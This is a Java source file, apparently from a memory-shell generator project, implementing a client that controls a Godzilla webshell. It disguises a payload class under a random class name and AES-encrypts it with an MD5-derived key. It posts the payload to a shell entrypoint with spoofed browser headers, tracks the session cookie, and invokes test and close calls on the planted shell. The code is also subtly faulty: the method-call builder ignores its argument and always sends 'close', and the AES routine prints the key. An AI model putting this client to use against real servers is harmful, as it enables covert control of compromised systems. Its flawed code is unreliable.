package com.reajason.javaweb.godzilla;

import com.reajason.javaweb.memsell.GodzillaGenerator;
import lombok.Getter;
import lombok.Setter;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import okhttp3.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

/**
 * @author ReaJason
 */
@Getter
@Setter
public class GodzillaManager implements Closeable {
    private final OkHttpClient client;
    private static final List<String> CLASS_NAMES;
    private String J_SESSION_ID = "";
    private String entrypoint;
    private String key;
    private String pass;
    private String md5;
    private Request request;
    private Map<String, String> headers = new HashMap<>();

    static {
        InputStream classNamesStream = Objects.requireNonNull(GodzillaGenerator.class.getResourceAsStream("/godzillaShellClassNames.txt"));
        CLASS_NAMES = IOUtils.readLines(classNamesStream, "UTF-8");
    }

    public static class GodzillaManagerBuilder {
        private String entrypoint;
        private String key;
        private String pass;
        private final Map<String, String> headers = new HashMap<>();

        public GodzillaManagerBuilder entrypoint(String entrypoint) {
            this.entrypoint = entrypoint;
            return this;
        }

        public GodzillaManagerBuilder key(String key) {
            this.key = key;
            return this;
        }

        public GodzillaManagerBuilder pass(String pass) {
            this.pass = pass;
            return this;
        }

        public GodzillaManagerBuilder header(String key, String value) {
            this.headers.put(key, value);
            return this;
        }

        public GodzillaManager build() {
            GodzillaManager manager = new GodzillaManager();
            manager.setEntrypoint(entrypoint);
            manager.setPass(pass);
            String md5Key = DigestUtils.md5Hex(key).substring(0, 16);
            String md5 = DigestUtils.md5Hex(pass + md5Key).toUpperCase();
            manager.setMd5(md5);
            manager.setKey(md5Key);
            Map<String, String> headers = new HashMap<>(16);
            headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
            headers.put("Content-Type", "application/x-www-form-urlencoded");
            headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            headers.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
            headers.putAll(this.headers);
            manager.setHeaders(headers);
            return manager;
        }
    }

    public static GodzillaManagerBuilder builder() {
        return new GodzillaManagerBuilder();
    }

    public GodzillaManager() {
        this.client = new OkHttpClient.Builder().build();
    }

    private Response post(byte[] bytes) throws IOException {
        byte[] aes = aes(bytes, true);
        assert aes != null;
        String base64String = Base64.encodeBase64String(aes);
        RequestBody requestBody = new FormBody.Builder()
                .add("pass", base64String)
                .build();
        Request.Builder builder = new Request.Builder()
                .url(this.entrypoint)
                .post(requestBody)
                .headers(Headers.of(this.headers));
        if (StringUtils.isNotBlank(J_SESSION_ID)) {
            builder.header("Cookie", J_SESSION_ID);
        }
        return client.newCall(builder.build()).execute();
    }

    public static byte[] generateGodzilla() {
        Random random = new Random();
        String className = CLASS_NAMES.get(random.nextInt(CLASS_NAMES.size()));
        try (DynamicType.Unloaded<?> make = new ByteBuddy()
                .redefine(Payload.class)
                .name(className)
                .make()) {
            return make.getBytes();
        }
    }

    public boolean start() {
        byte[] bytes = generateGodzilla();
        try (Response response = post(bytes)) {
            String setCookie = response.header("Set-Cookie");
            if (setCookie != null && setCookie.contains("JSESSIONID=")) {
                J_SESSION_ID = setCookie.substring(setCookie.indexOf("JSESSIONID="), setCookie.indexOf(";"));
            }
            return response.code() == 200;
        } catch (IOException e) {
            return false;
        }
    }

    public boolean test() {
        byte[] bytes = generateMethodCallBytes("test");
        try (Response response = post(bytes)) {
            if (response.code() == 200) {
                ResponseBody body = response.body();
                if (body != null) {
                    String resultFromRes = getResultFromRes(body.string());
                    return "ok".equals(resultFromRes);
                }
            }
            return false;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    @Override
    public void close() throws IOException {
        byte[] bytes = generateMethodCallBytes("close");
        try (Response response = post(bytes)) {
            if (response.code() == 200) {
                ResponseBody body = response.body();
            }
        } catch (IOException ignore) {

        }
    }

    /**
     * AES 加解密
     *
     * @param bytes    加解密的字符串字节数组
     * @param encoding 是否为加密，true 为加密，false 解密
     * @return 返回加解密后的字节数组
     */
    public byte[] aes(byte[] bytes, boolean encoding) {
        System.out.println(key);
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(encoding ? 1 : 2, new SecretKeySpec(this.key.getBytes(), "AES"));
            return c.doFinal(bytes);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private boolean isValidResponse(String response) {
        if (StringUtils.isEmpty(response)) {
            return false;
        }
        return response.startsWith(md5.substring(0, 16)) && response.endsWith(md5.substring(16));
    }

    public String getResultFromRes(String responseBody) throws IOException {
        String result = responseBody.substring(16);
        result = result.substring(0, result.length() - 16);
        byte[] bytes = Base64.decodeBase64(result);
        byte[] x = aes(bytes, false);
        GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(x));
        return IOUtils.toString(gzipInputStream, StandardCharsets.UTF_8);
    }

    Map<String, String> restorePayload(String payload) throws IOException {
        String p = URLDecoder.decode(payload, "UTF-8");
        Map<String, String> map = new HashMap<>();
        byte[] bytes = Base64.decodeBase64(p);
        byte[] x = aes(bytes, false);
        ByteArrayInputStream tStream = new ByteArrayInputStream(x);
        ByteArrayOutputStream tp = new ByteArrayOutputStream();
        byte[] lenB = new byte[4];
        int read;
        try {
            GZIPInputStream inputStream = new GZIPInputStream(tStream);
            while (true) {
                byte t = (byte) inputStream.read();
                if (t != -1) {
                    if (t == 2) {
                        String key = tp.toString();
                        int read1 = inputStream.read(lenB);
                        int len = bytesToInt(lenB);
                        byte[] data = new byte[len];
                        int readOneLen = 0;
                        do {
                            read = readOneLen + inputStream.read(data, readOneLen, data.length - readOneLen);
                            readOneLen = read;
                        } while (read < data.length);
                        map.put(key, new String(data));
                        tp.reset();
                    } else {
                        tp.write(t);
                    }
                } else {
                    tp.close();
                    tStream.close();
                    inputStream.close();
                    break;
                }
            }
        } catch (Exception ignored) {
        }
        return map;
    }

    public static int bytesToInt(byte[] bytes) {
        return (bytes[0] & 255) | ((bytes[1] & 255) << 8) | ((bytes[2] & 255) << 16) | ((bytes[3] & 255) << 24);
    }

    @SneakyThrows
    private byte[] generateMethodCallBytes(String methodName) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try (GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);) {
            byte[] value = "close".getBytes();
            gzipOutputStream.write("methodName".getBytes());
            gzipOutputStream.write(2);
            gzipOutputStream.write(intToBytes(value.length));
            gzipOutputStream.write(value);
        }
        return byteArrayOutputStream.toByteArray();
    }

    public static byte[] intToBytes(int value) {
        return new byte[]{(byte) (value & 255), (byte) ((value >> 8) & 255), (byte) ((value >> 16) & 255), (byte) ((value >> 24) & 255)};
    }
}